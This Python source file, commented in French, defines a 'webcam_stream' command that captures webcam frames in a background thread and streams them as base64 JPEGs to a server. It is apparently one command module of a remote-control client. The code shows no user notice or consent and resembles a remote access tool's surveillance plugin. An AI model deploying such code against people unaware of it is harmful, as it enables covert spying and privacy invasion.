# Commande de streaming vidéo continu depuis la webcam.
# Le flux est capturé en boucle dans un thread séparé et envoyé
# en continu au serveur sous forme de frames encodées en base64.

import cv2
import base64
import threading
import time


class WebcamStreamCommand:

    # Nom de la commande dans le registry
    name = "webcam_stream"

    def __init__(self, client):

        # Référence vers le client pour envoyer les frames
        self.client = client

        # État du streaming (actif/inactif)
        self.streaming = False

        # Thread dédié au streaming vidéo
        self.thread = None

    def execute(self, args: str) -> str:

        # Normalisation des arguments
        args = args.strip().lower()

        # ---------------- START STREAM ----------------
        if args == "start":

            # Empêche le double démarrage
            if self.streaming:
                return "STREAM\nERROR\nAlready streaming"

            self.streaming = True

            # Lancement du thread de capture vidéo
            self.thread = threading.Thread(target=self._stream_loop, daemon=True)

            self.thread.start()

            return "STREAM\nOK\nStarted"

        # ---------------- STOP STREAM ----------------
        if args == "stop":

            # Vérifie que le stream est actif
            if not self.streaming:
                return "STREAM\nERROR\nNot streaming"

            # Arrêt du loop de capture
            self.streaming = False

            return "STREAM\nOK\nStopped"

        # Mauvaise utilisation de la commande
        return "STREAM\nERROR\n" "Usage: webcam_stream start|stop"

    def _stream_loop(self):

        # Ouverture de la webcam
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():

            self.streaming = False
            return

        try:

            # Boucle principale du streaming
            while self.streaming:

                # Capture d'une frame
                ret, frame = cap.read()

                if not ret:
                    break

                # Réduction de la résolution pour limiter le débit
                frame = cv2.resize(frame, (640, 480))

                # Encodage JPEG avec compression
                success, buffer = cv2.imencode(
                    ".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60]
                )

                if not success:
                    continue

                # Encodage base64 pour transport réseau
                encoded = base64.b64encode(buffer).decode()

                # Message envoyé au serveur
                message = "WEBCAM_STREAM\n" "FRAME\n" + encoded

                # Envoi immédiat de la frame
                self.client.send(message)

                # Limitation du framerate (~12 FPS)
                time.sleep(0.08)

        finally:

            # Libération de la webcam même en cas d'erreur
            cap.release()
